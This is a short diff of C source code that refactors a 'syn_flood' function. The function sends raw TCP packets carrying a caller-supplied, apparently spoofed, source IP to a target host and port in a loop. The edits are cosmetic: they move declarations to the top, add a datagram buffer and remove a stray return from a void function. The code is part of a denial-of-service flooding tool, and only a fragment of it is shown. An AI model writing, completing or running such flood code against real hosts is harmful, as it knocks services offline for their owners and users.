@@ -139,10 +139,13 @@ int tcp_send(char *datagram, int sfd, struct sockaddr_in servaddr, struct iphdr*
 void syn_flood(char* hostname, int port, char* source_ip)
 {
     //create the UDP socket
-
-    int sfd = get_sock_fd();
+    int sfd;
+    char datagram[4096];
+    struct sockaddr_in servaddr;
+    
+    sfd = get_sock_fd();
     //configure the socket
-    struct sockaddr_in servaddr = configure_sock(port, hostname);
+    servaddr = configure_sock(port, hostname);
     //create the ip header
     struct iphdr* iph = configure_packet(source_ip, datagram, servaddr);
     
@@ -157,6 +160,5 @@ void syn_flood(char* hostname, int port, char* source_ip)
         tcp_send(datagram, sfd, servaddr, iph);
     }
     close(sfd);
-    return 0;
 }
 
